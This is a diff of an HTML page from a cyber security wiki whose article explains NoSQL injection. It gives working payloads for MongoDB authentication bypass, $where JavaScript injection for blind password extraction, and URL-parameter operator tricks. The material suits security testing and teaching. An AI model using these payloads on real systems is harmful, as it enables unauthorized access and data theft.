@@ -1,39 +1,57 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="NoSQL Injection # NoSQL Injection Fundamentals # What is NoSQLi? # NoSQL Injection occurs when untrusted user input is embedded into NoSQL queries without proper validation or sanitization, leading to unauthorized actions such as authentication bypass, data theft, or remote code execution. It can be exploited via syntax injection and operator injection.
-Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload.">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="NoSQL Injection" />
-<meta property="og:description" content="NoSQL Injection # NoSQL Injection Fundamentals # What is NoSQLi? # NoSQL Injection occurs when untrusted user input is embedded into NoSQL queries without proper validation or sanitization, leading to unauthorized actions such as authentication bypass, data theft, or remote code execution. It can be exploited via syntax injection and operator injection.
-Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/NoSQL-Injection/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
-<title>NoSQL Injection | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="NoSQL Injection# NoSQL Injection Fundamentals# What is NoSQLi?# NoSQL Injection occurs when untrusted user input is embedded into NoSQL queries without proper validation or sanitization, leading to unauthorized actions such as authentication bypass, data theft, or remote code execution. It can be exploited via syntax injection and operator injection.
+Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. Operator injection - This occurs when you can use NoSQL query operators to manipulate queries. SQLi vs NoSQLi# Aspect SQL Injection NoSQL Injection Query Language SQL JSON, BSON, JavaScript, Lua Syntax &#39; OR &#39;1&#39;=&#39;1 {&#34;$ne&#34;: null} Execution Context DB server App server / DB engine Query Formation String concatenation JSON/JavaScript embedding DB Targets MySQL, PostgreSQL MongoDB, CouchDB, Firebase, Redis Operator Usage Logical/Arithmetic (AND, OR) $ne, $gt, $regex, $where Attack Surface# Common locations to probe for NoSQL injection:
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/NoSQL-Injection/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="NoSQL Injection">
+	<meta property="og:description" content="NoSQL Injection# NoSQL Injection Fundamentals# What is NoSQLi?# NoSQL Injection occurs when untrusted user input is embedded into NoSQL queries without proper validation or sanitization, leading to unauthorized actions such as authentication bypass, data theft, or remote code execution. It can be exploited via syntax injection and operator injection.
+Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. Operator injection - This occurs when you can use NoSQL query operators to manipulate queries. SQLi vs NoSQLi# Aspect SQL Injection NoSQL Injection Query Language SQL JSON, BSON, JavaScript, Lua Syntax &#39; OR &#39;1&#39;=&#39;1 {&#34;$ne&#34;: null} Execution Context DB server App server / DB engine Query Formation String concatenation JSON/JavaScript embedding DB Targets MySQL, PostgreSQL MongoDB, CouchDB, Firebase, Redis Operator Usage Logical/Arithmetic (AND, OR) $ne, $gt, $regex, $where Attack Surface# Common locations to probe for NoSQL injection:">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30">
+
+
+	<meta itemprop="name" content="NoSQL Injection">
+	<meta itemprop="description" content="NoSQL Injection# NoSQL Injection Fundamentals# What is NoSQLi?# NoSQL Injection occurs when untrusted user input is embedded into NoSQL queries without proper validation or sanitization, leading to unauthorized actions such as authentication bypass, data theft, or remote code execution. It can be exploited via syntax injection and operator injection.
+Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. Operator injection - This occurs when you can use NoSQL query operators to manipulate queries. SQLi vs NoSQLi# Aspect SQL Injection NoSQL Injection Query Language SQL JSON, BSON, JavaScript, Lua Syntax &#39; OR &#39;1&#39;=&#39;1 {&#34;$ne&#34;: null} Execution Context DB server App server / DB engine Query Formation String concatenation JSON/JavaScript embedding DB Targets MySQL, PostgreSQL MongoDB, CouchDB, Firebase, Redis Operator Usage Logical/Arithmetic (AND, OR) $ne, $gt, $regex, $where Attack Surface# Common locations to probe for NoSQL injection:">
+	<meta itemprop="dateModified" content="2026-08-05T21:53:05+05:30">
+	<meta itemprop="wordCount" content="1397">
+
+<title>NoSQL Injection • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/NoSQL-Injection/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -41,11 +59,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -56,9 +78,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -73,8 +92,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -90,8 +109,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -177,8 +196,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -225,8 +244,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -980,8 +999,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1002,8 +1021,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1024,8 +1043,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1046,8 +1065,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1068,8 +1087,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1103,8 +1122,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1125,8 +1144,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1147,8 +1166,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1169,35 +1188,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1205,30 +1202,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>NoSQL Injection</strong>
+  <h3>NoSQL Injection</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1295,226 +1293,182 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="nosql-injection">
-  NoSQL Injection
-  <a class="anchor" href="#nosql-injection">#</a>
-</h1>
-<h2 id="nosql-injection-fundamentals">
-  NoSQL Injection Fundamentals
-  <a class="anchor" href="#nosql-injection-fundamentals">#</a>
-</h2>
-<h3 id="what-is-nosqli">
-  What is NoSQLi?
-  <a class="anchor" href="#what-is-nosqli">#</a>
-</h3>
+  <article class="markdown book-article"><h1 id="nosql-injection">NoSQL Injection<a class="anchor" href="#nosql-injection">#</a></h1>
+<h2 id="nosql-injection-fundamentals">NoSQL Injection Fundamentals<a class="anchor" href="#nosql-injection-fundamentals">#</a></h2>
+<h3 id="what-is-nosqli">What is NoSQLi?<a class="anchor" href="#what-is-nosqli">#</a></h3>
 <p>NoSQL Injection occurs when untrusted user input is embedded into NoSQL queries without proper validation or sanitization, leading to unauthorized actions such as authentication bypass, data theft, or remote code execution. It can be exploited via syntax injection and operator injection.</p>
 <ul>
 <li>Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload.</li>
 <li>Operator injection - This occurs when you can use NoSQL query operators to manipulate queries.</li>
 </ul>
-<h3 id="sqli-vs-nosqli">
-  SQLi vs NoSQLi
-  <a class="anchor" href="#sqli-vs-nosqli">#</a>
-</h3>
+<h3 id="sqli-vs-nosqli">SQLi vs NoSQLi<a class="anchor" href="#sqli-vs-nosqli">#</a></h3>
 <table>
-<thead>
-<tr>
-<th>Aspect</th>
-<th>SQL Injection</th>
-<th>NoSQL Injection</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Query Language</td>
-<td>SQL</td>
-<td>JSON, BSON, JavaScript, Lua</td>
-</tr>
-<tr>
-<td>Syntax</td>
-<td><code>' OR '1'='1</code></td>
-<td><code>{&quot;$ne&quot;: null}</code></td>
-</tr>
-<tr>
-<td>Execution Context</td>
-<td>DB server</td>
-<td>App server / DB engine</td>
-</tr>
-<tr>
-<td>Query Formation</td>
-<td>String concatenation</td>
-<td>JSON/JavaScript embedding</td>
-</tr>
-<tr>
-<td>DB Targets</td>
-<td>MySQL, PostgreSQL</td>
-<td>MongoDB, CouchDB, Firebase, Redis</td>
-</tr>
-<tr>
-<td>Operator Usage</td>
-<td>Logical/Arithmetic (AND, OR)</td>
-<td><code>$ne</code>, <code>$gt</code>, <code>$regex</code>, <code>$where</code></td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Aspect</th>
+					<th>SQL Injection</th>
+					<th>NoSQL Injection</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Query Language</td>
+					<td>SQL</td>
+					<td>JSON, BSON, JavaScript, Lua</td>
+			</tr>
+			<tr>
+					<td>Syntax</td>
+					<td><code>' OR '1'='1</code></td>
+					<td><code>{&quot;$ne&quot;: null}</code></td>
+			</tr>
+			<tr>
+					<td>Execution Context</td>
+					<td>DB server</td>
+					<td>App server / DB engine</td>
+			</tr>
+			<tr>
+					<td>Query Formation</td>
+					<td>String concatenation</td>
+					<td>JSON/JavaScript embedding</td>
+			</tr>
+			<tr>
+					<td>DB Targets</td>
+					<td>MySQL, PostgreSQL</td>
+					<td>MongoDB, CouchDB, Firebase, Redis</td>
+			</tr>
+			<tr>
+					<td>Operator Usage</td>
+					<td>Logical/Arithmetic (AND, OR)</td>
+					<td><code>$ne</code>, <code>$gt</code>, <code>$regex</code>, <code>$where</code></td>
+			</tr>
+	</tbody>
 </table>
 <hr>
-<h2 id="attack-surface">
-  Attack Surface
-  <a class="anchor" href="#attack-surface">#</a>
-</h2>
+<h2 id="attack-surface">Attack Surface<a class="anchor" href="#attack-surface">#</a></h2>
 <p>Common locations to probe for NoSQL injection:</p>
 <table>
-<thead>
-<tr>
-<th>Entry Point</th>
-<th>Example</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>Login / Auth endpoints</strong></td>
-<td><code>POST /login</code> with username/password JSON body</td>
-</tr>
-<tr>
-<td><strong>Search and filter APIs</strong></td>
-<td><code>GET /api/products?name=shirt</code>, filter parameters</td>
-</tr>
-<tr>
-<td><strong>GraphQL queries</strong></td>
-<td>Nested query variables passed to MongoDB resolver</td>
-</tr>
-<tr>
-<td><strong>ODM/ORM layer</strong></td>
-<td>Mongoose <code>.find()</code> / <code>.findOne()</code> with unsanitized input</td>
-</tr>
-<tr>
-<td><strong>HTTP GET params</strong></td>
-<td><code>?id[$ne]=0</code>, <code>?role[$in][]=admin</code></td>
-</tr>
-<tr>
-<td><strong>Cookie / Header values</strong></td>
-<td>Session token, role header passed to DB lookup</td>
-</tr>
-<tr>
-<td><strong>Password reset flows</strong></td>
-<td>Email lookup query built from user-supplied email</td>
-</tr>
-<tr>
-<td><strong>JSON API body</strong></td>
-<td>Any field accepting object-type input in JSON</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Entry Point</th>
+					<th>Example</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><strong>Login / Auth endpoints</strong></td>
+					<td><code>POST /login</code> with username/password JSON body</td>
+			</tr>
+			<tr>
+					<td><strong>Search and filter APIs</strong></td>
+					<td><code>GET /api/products?name=shirt</code>, filter parameters</td>
+			</tr>
+			<tr>
+					<td><strong>GraphQL queries</strong></td>
+					<td>Nested query variables passed to MongoDB resolver</td>
+			</tr>
+			<tr>
+					<td><strong>ODM/ORM layer</strong></td>
+					<td>Mongoose <code>.find()</code> / <code>.findOne()</code> with unsanitized input</td>
+			</tr>
+			<tr>
+					<td><strong>HTTP GET params</strong></td>
+					<td><code>?id[$ne]=0</code>, <code>?role[$in][]=admin</code></td>
+			</tr>
+			<tr>
+					<td><strong>Cookie / Header values</strong></td>
+					<td>Session token, role header passed to DB lookup</td>
+			</tr>
+			<tr>
+					<td><strong>Password reset flows</strong></td>
+					<td>Email lookup query built from user-supplied email</td>
+			</tr>
+			<tr>
+					<td><strong>JSON API body</strong></td>
+					<td>Any field accepting object-type input in JSON</td>
+			</tr>
+	</tbody>
 </table>
-<h2 id="operator-based-injection">
-  Operator-Based Injection
-  <a class="anchor" href="#operator-based-injection">#</a>
-</h2>
+<h2 id="operator-based-injection">Operator-Based Injection<a class="anchor" href="#operator-based-injection">#</a></h2>
 <p>Exploiting MongoDB query operators to manipulate database logic and bypass security controls.</p>
 <table>
-<thead>
-<tr>
-<th>Operator</th>
-<th>Description</th>
-<th>Use Case</th>
-<th>Payload Example</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>$ne</td>
-<td>Not equal</td>
-<td>Auth bypass / inequality</td>
-<td>{&ldquo;user&rdquo;: {&quot;$ne&quot;: null}}</td>
-</tr>
-<tr>
-<td>$gt / $lt</td>
-<td>Greater/Less than</td>
-<td>Dump data / type confusion</td>
-<td>{&ldquo;age&rdquo;: {&quot;$gt&quot;: 0}}</td>
-</tr>
-<tr>
-<td>$in / $nin</td>
-<td>In / Not in array</td>
-<td>Value bruteforce / DoS</td>
-<td>{&ldquo;id&rdquo;: {&quot;$in&quot;: [1,2,3,4]}}</td>
-</tr>
-<tr>
-<td>$or / $and</td>
-<td>Logical OR/AND</td>
-<td>Auth bypass / logic abuse</td>
-<td>{&quot;$or&quot;: [{&ldquo;admin&rdquo;: true}, {}]}</td>
-</tr>
-<tr>
-<td>$exists</td>
-<td>Field existence check</td>
-<td>Discover hidden fields</td>
-<td>{&ldquo;SSN&rdquo;: {&quot;$exists&quot;: true}}</td>
-</tr>
-<tr>
-<td>$regex</td>
-<td>Regular expression</td>
-<td>Blind enumeration</td>
-<td>{&ldquo;email&rdquo;: {&quot;$regex&quot;: &ldquo;^a&rdquo;}}</td>
-</tr>
-<tr>
-<td>$where</td>
-<td>JavaScript expression</td>
-<td>RCE / complex logic bypass</td>
-<td>{&quot;$where&quot;: &ldquo;return true&rdquo;}</td>
-</tr>
-<tr>
-<td>$not</td>
-<td>Invert operator result</td>
-<td>Reverse filter conditions</td>
-<td>{&ldquo;age&rdquo;: {&quot;$not&quot;: {&quot;$gt&quot;: 10}}}</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Operator</th>
+					<th>Description</th>
+					<th>Use Case</th>
+					<th>Payload Example</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>$ne</td>
+					<td>Not equal</td>
+					<td>Auth bypass / inequality</td>
+					<td>{&ldquo;user&rdquo;: {&quot;$ne&quot;: null}}</td>
+			</tr>
+			<tr>
+					<td>$gt / $lt</td>
+					<td>Greater/Less than</td>
+					<td>Dump data / type confusion</td>
+					<td>{&ldquo;age&rdquo;: {&quot;$gt&quot;: 0}}</td>
+			</tr>
+			<tr>
+					<td>$in / $nin</td>
+					<td>In / Not in array</td>
+					<td>Value bruteforce / DoS</td>
+					<td>{&ldquo;id&rdquo;: {&quot;$in&quot;: [1,2,3,4]}}</td>
+			</tr>
+			<tr>
+					<td>$or / $and</td>
+					<td>Logical OR/AND</td>
+					<td>Auth bypass / logic abuse</td>
+					<td>{&quot;$or&quot;: [{&ldquo;admin&rdquo;: true}, {}]}</td>
+			</tr>
+			<tr>
+					<td>$exists</td>
+					<td>Field existence check</td>
+					<td>Discover hidden fields</td>
+					<td>{&ldquo;SSN&rdquo;: {&quot;$exists&quot;: true}}</td>
+			</tr>
+			<tr>
+					<td>$regex</td>
+					<td>Regular expression</td>
+					<td>Blind enumeration</td>
+					<td>{&ldquo;email&rdquo;: {&quot;$regex&quot;: &ldquo;^a&rdquo;}}</td>
+			</tr>
+			<tr>
+					<td>$where</td>
+					<td>JavaScript expression</td>
+					<td>RCE / complex logic bypass</td>
+					<td>{&quot;$where&quot;: &ldquo;return true&rdquo;}</td>
+			</tr>
+			<tr>
+					<td>$not</td>
+					<td>Invert operator result</td>
+					<td>Reverse filter conditions</td>
+					<td>{&ldquo;age&rdquo;: {&quot;$not&quot;: {&quot;$gt&quot;: 10}}}</td>
+			</tr>
+	</tbody>
 </table>
 <p>Common Patterns:</p>
 <pre tabindex="0"><code>{&#34;username&#34;: {&#34;$ne&#34;: null}, &#34;password&#34;: {&#34;$ne&#34;: null}}     // Bypass login with inequality
 {&#34;role&#34;: {&#34;$in&#34;: [&#34;admin&#34;, &#34;moderator&#34;]}}                  // Privilege enumeration
 {&#34;isActive&#34;: {&#34;$exists&#34;: false}}                           // Find incomplete records
-{&#34;price&#34;: {&#34;$gt&#34;: 0, &#34;$lt&#34;: 999999}}                       // Extract all records in range
-</code></pre><hr>
-<h2 id="syntax-injection">
-  <strong>Syntax Injection</strong>
-  <a class="anchor" href="#syntax-injection">#</a>
-</h2>
-<h3 id="string-context-break">
-  String Context Break
-  <a class="anchor" href="#string-context-break">#</a>
-</h3>
+{&#34;price&#34;: {&#34;$gt&#34;: 0, &#34;$lt&#34;: 999999}}                       // Extract all records in range</code></pre><hr>
+<h2 id="syntax-injection"><strong>Syntax Injection</strong><a class="anchor" href="#syntax-injection">#</a></h2>
+<h3 id="string-context-break">String Context Break<a class="anchor" href="#string-context-break">#</a></h3>
 <pre tabindex="0"><code>admin&#39; || &#39;1&#39;==&#39;1                                           // Always true
-admin&#39; &amp;&amp; this.password.match(/.*/)//                       // Regex bypass + comment
-</code></pre><h3 id="javascript-injection-where">
-  JavaScript Injection ($where)
-  <a class="anchor" href="#javascript-injection-where">#</a>
-</h3>
+admin&#39; &amp;&amp; this.password.match(/.*/)//                       // Regex bypass + comment</code></pre><h3 id="javascript-injection-where">JavaScript Injection ($where)<a class="anchor" href="#javascript-injection-where">#</a></h3>
 <pre tabindex="0"><code>{&#34;$where&#34;: &#34;sleep(5000)&#34;}                                   // Time-based blind
 {&#34;$where&#34;: &#34;this.password[0]==&#39;a&#39;&#34;}                         // Extract character
-{&#34;$where&#34;: &#34;this.password.length==8&#34;}                       // Length check
-</code></pre><h3 id="json-injection">
-  JSON Injection
-  <a class="anchor" href="#json-injection">#</a>
-</h3>
+{&#34;$where&#34;: &#34;this.password.length==8&#34;}                       // Length check</code></pre><h3 id="json-injection">JSON Injection<a class="anchor" href="#json-injection">#</a></h3>
 <pre tabindex="0"><code>&#34;, &#34;password&#34;: {&#34;$ne&#34;: null}, &#34;x&#34;: &#34;                        // Inject operator
-&#34;, &#34;$or&#34;: [{&#34;admin&#34;: true}, {&#34;x&#34;: &#34;                         // Inject OR logic
-</code></pre><h3 id="detection">
-  Detection
-  <a class="anchor" href="#detection">#</a>
-</h3>
+&#34;, &#34;$or&#34;: [{&#34;admin&#34;: true}, {&#34;x&#34;: &#34;                         // Inject OR logic</code></pre><h3 id="detection">Detection<a class="anchor" href="#detection">#</a></h3>
 <pre tabindex="0"><code>&#39; || 1==1//                                                  // Should succeed
 &#39; &amp;&amp; 0==1//                                                  // Should fail
-&#39; || sleep(5000)//                                           // Time delay
-</code></pre><hr>
-<h2 id="exploitation--bypassing-defenses">
-  Exploitation &amp; Bypassing defenses
-  <a class="anchor" href="#exploitation--bypassing-defenses">#</a>
-</h2>
-<h3 id="1-authentication-bypass">
-  1. Authentication Bypass
-  <a class="anchor" href="#1-authentication-bypass">#</a>
-</h3>
+&#39; || sleep(5000)//                                           // Time delay</code></pre><hr>
+<h2 id="exploitation--bypassing-defenses">Exploitation &amp; Bypassing defenses<a class="anchor" href="#exploitation--bypassing-defenses">#</a></h2>
+<h3 id="1-authentication-bypass">1. Authentication Bypass<a class="anchor" href="#1-authentication-bypass">#</a></h3>
 <p><strong>Use Cases</strong>: Login without valid credentials.</p>
 <p><strong>Test Cases / Payloads</strong>:</p>
 <ul>
@@ -1523,8 +1477,7 @@ admin&#39; &amp;&amp; this.password.match(/.*/)//                       // Regex
 <pre tabindex="0"><code>username[$ne]=toto&amp;password[$ne]=toto
 login[$regex]=a.*&amp;pass[$ne]=lol
 login[$gt]=admin&amp;login[$lt]=test&amp;pass[$ne]=1
-login[$nin][]=admin&amp;login[$nin][]=test&amp;pass[$ne]=toto
-</code></pre></li>
